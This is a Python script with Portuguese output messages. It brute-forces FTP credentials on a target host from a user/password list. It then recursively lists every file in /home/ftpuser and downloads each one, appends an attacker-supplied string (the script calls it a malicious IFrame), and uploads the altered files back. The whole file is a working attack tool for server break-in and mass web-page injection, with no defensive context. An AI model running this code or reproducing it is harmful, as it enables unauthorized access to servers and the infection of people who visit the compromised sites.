import ftplib
import optparse
import os


def bruteForce(host, pw_file):
    pw_file = open(pw_file, 'r')

    for line in pw_file.readlines():
        user = line.split(':')[0]
        pw = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Tentando: " + user + "/" + pw)
        try:
            ftp = ftplib.FTP(host, timeout=5)
            ftp.login(user, pw)
            print('\n[*] ' + host +
                  ' FTP Login Sucesso: ' + user + "/" + pw)
            ftp.quit()
            return (user, pw)
        except Exception:
            pass
    print('\n[-] Não foi possível descobrir as credenciais FTP.')
    exit(0)


def loginAnonimo(host_alvo):
    try:
        ftp = ftplib.FTP(host_alvo, timeout=5)
        ftp.login('anonymous', 'anonymous')
        print('[*] ' + host_alvo + ' FTP Login Anonimo Sucesso.')
        ftp.quit()
        return True
    except Exception:
        print('[-] ' + host_alvo + ' FTP Login Anonimo Falhou.')
    return False


def listFiles(ftp, path=''):
    files = []
    for item in ftp.nlst(path or "/home/ftpuser"):
        if '.' in item:
            files.append(item.replace('/home/ftpuser', '')[1:])
        else:
            files += listFiles(ftp, path=item)
    return files


def injectPage(ftp, filename, redirect):
    print(filename)

    if not os.path.exists("temp"):
        os.makedirs("temp")

    dir_path = os.path.dirname("temp/" + filename)

    if not os.path.exists(dir_path):
        os.makedirs(dir_path)

    f = open("temp/" + filename + '.tmp', 'w')
    ftp.retrlines('RETR ' + filename, f.write)
    print('[+] Página baixada: ' + filename)

    f.write(redirect)
    f.close()
    print('[+] Injetado IFrame malicioso em: ' + filename)

    ftp.storbinary('STOR ' + filename, open("temp/" + filename + '.tmp', 'rb'))
    print('[+] Página injetada enviada: ' + filename)


def start():
    opt = optparse.OptionParser('Use -H <host> -f <passwords_file>')
    opt.add_option('-H', dest='host', type='string', help='specify the host')
    opt.add_option('-f', dest='file', type='string',
                   help='specify the users and passwords file')
    opt.add_option('-r', dest='injectable', type='string',
                   help='specify the injetable string')

    (options, _) = opt.parse_args()

    host = options.host
    file = options.file
    injectable = options.injectable

    if (host == None) | (file == None):
        print(opt.usage)
        exit(0)

    (user, pw) = bruteForce(host, file)

    # loginAnonimo(host)

    ftp = ftplib.FTP(host)
    ftp.login(user, pw)

    pages: list[str] = listFiles(ftp)

    print("\n[-] Arquivos encontrados: " + str(len(pages)))

    print("\n[-] Inject Pages")

    for page in pages:
        injectPage(ftp, page, injectable)


if __name__ == "__main__":
    start()
